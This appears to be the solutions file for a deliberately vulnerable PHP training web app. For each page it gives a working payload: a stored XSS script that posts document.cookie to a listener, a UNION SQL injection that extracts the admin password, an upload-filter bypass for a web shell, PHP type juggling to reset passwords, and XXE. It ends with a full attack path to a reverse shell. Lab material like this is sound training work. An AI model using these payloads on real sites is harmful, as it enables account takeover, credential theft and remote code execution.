
## Solutions & vulnerability locations

**Comments - comments.php**

Name and Comment field should accept something like:
```
{
'name':'name',
'comment':'<script>fetch("http://127.0.0.1:8888",{method: "post",mode: "no-cors",body:document.cookie});</script>'
}
```
Comments and names are stored on the MySQL db and automatically loaded when the page is refreshed.

With a python listener on the host machine, a script like the above should return a cookie.  Since this is not a real website, you'll have to manually log in to test it.

**Order Form - order.php**

Saves an order as an XML file. Only the webadmin account can review orders. Send some XXE here for later.

**Products Page - Products.php**

Very open to SQL injection.  Once authenticated as a base user, the attacker can get the webadmin password with something in the product search like:
```
1 UNION SELECT NULL, Username, Password FROM users WHERE Username = "webadmin"
```

**Gallery - social.php**

Reasonable file upload filter, but still weak.  This filter will catch files ending in php, but not php.jpg.  This should work:
`evil.php.jpeg`
Then, if an attacker has also grabbed the webadmin password from the products page, from the admin portal they can rename uploads and change the file to `evil.php`.

I've included a cmd.php file in the Notes folder if you want to test it.

## Admin-only Pages

**Admin - admin_page.php**

This page contains a way to list uploaded image files and rename or delete them, as well as a way to view XML order forms. Both allow for RCE and potentially a reverse shell, depending on the exploitation path.  Maliciously uploaded image files can be renamed, and XML orders can be viewed. The "recover image" functionalty doesn't let you recover images submitted by other users.  Its there in case you delete something and want it back.  XML orders files, uploaded images, and 'deleted' images are in the Resources folder path of the source code.

An image file can be accessed at the localhost:8000/resources/user_images/<evil.file> path.

**Reset Password - reset_pw.php**

PHP type juggling.  This page does not check to see if the user for which the password is being changed is the same user that is logged in.  It just sets the $username_entered variable equal to whatever $_POST['Username'] is.  It does, however, check the $new_password against the $username_entered password in the DB.  

The syntax in the logic is vulnerable:
```
if (($_POST['new_password'] == $_POST['new_password2']) && (strcmp($_POST['old_password'],$password) == 0)){
```
The first half of this section checks that the new password is entered twice, identically.  The second half compares the DB and user-supplied password to ensure that they are the same.  The `== 0` comparison is weak.  PHP evaluates empty arrays as false, which is also "equal to" zero.  Intercepting the HTTP request and changing the 'old_password' to an empty array should allow an attacker to reset the webadmin's password to whatever they like.  Something like this should work:

```
In Burp Suite or another proxy, change old_password=foobar to old_password[]=''
```

**View Orders - view_order.php**

This page renders user provided XML (in the form of an "order form") to the webadmin user.  This should be useful for leveraging XXE attacks submitted via the 'Order Form' page. Orders are automatically assigned numeric names in ascending order.

**continue.php**

This page reflects the user name back to an authenticated user.  Untested, but likely will accept XSS or other input based attacks.  User name is committed to the DB.  No functionality to add a new user or "sign up" is included in the site currently, so it would be difficult to exploit without DB injection.

**db.php**

Hard-coded database credentials are not securely stored, and are left in the default webroot file path.

## No deliberate exploit path, but probably vulnerable anyway due to lazy development ##
- **login.php**
- **logout.php**
- **php.ini** This is just here for docker.
- **phpinfo.php** Included for fun, and can be attacked.
- **continue.php**

This page reflects the user name back to an authenticated user.  Untested, but likely will accept XSS or other input based attacks.  User name is committed to the DB.  No functionality to add a new user or "sign up" is included in the site currently, so it would be difficult to exploit without DB injection.

- **secretdir.php**

The file "secretdir" just holds functions.  It initially was for something else, but I never renamed it.  

## Example Attack Path

**As a user**
1. Stored XSS via comments to obtain user cookie
2. Authenticate with user cookie (or just skip this step and log in as a user from the start)
3. upload a shell with a .php.jgp extension on the 'Gallery' page. Other script types may work, like sh.jpg.
4. Navigate to products page
5. SQLi products page via union select for webadmin password

OR

PHP type juggling to reset webadmin password

Alternatively, attempt an XXE injection on the "Orders page" for later use.

**As webadmin**
1. authenticate as webadmin
2. admin page is now available, although there is no button.  It is admin_page.php.
The admin_page.php site is available after logging in as "webadmin" and clicking the "click here to continue message". A new link for the admin portal should appear.
3. change shell from jpg to php extension
4. use uploaded shell for RCE at /resources/user_images/<filename.php>
5. attempt reverse shell

Alternatively, review the XXE order you placed earlier.
